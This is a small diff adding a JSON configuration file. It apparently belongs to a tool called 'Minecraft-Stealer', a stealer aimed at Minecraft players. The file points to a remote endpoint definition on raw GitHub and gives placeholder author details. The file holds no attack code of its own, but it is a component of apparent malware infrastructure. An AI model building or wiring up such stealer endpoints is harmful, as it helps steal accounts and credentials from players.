@@ -1,0 +1,13 @@
+{
+    "token": "00000-00001",
+    "type": "endpoint",
+    "version": "3.2.0",
+    "endpoint": {
+        "URL": "https://raw.githubusercontent.com/agamsol/Minecraft-Stealer/main/v3.2.0/Identifiers/endpoint.json"
+    },
+    "author": {
+        "name": "Tester",
+        "tag": "1111",
+        "ID": "509674496760872960"
+    }
+}
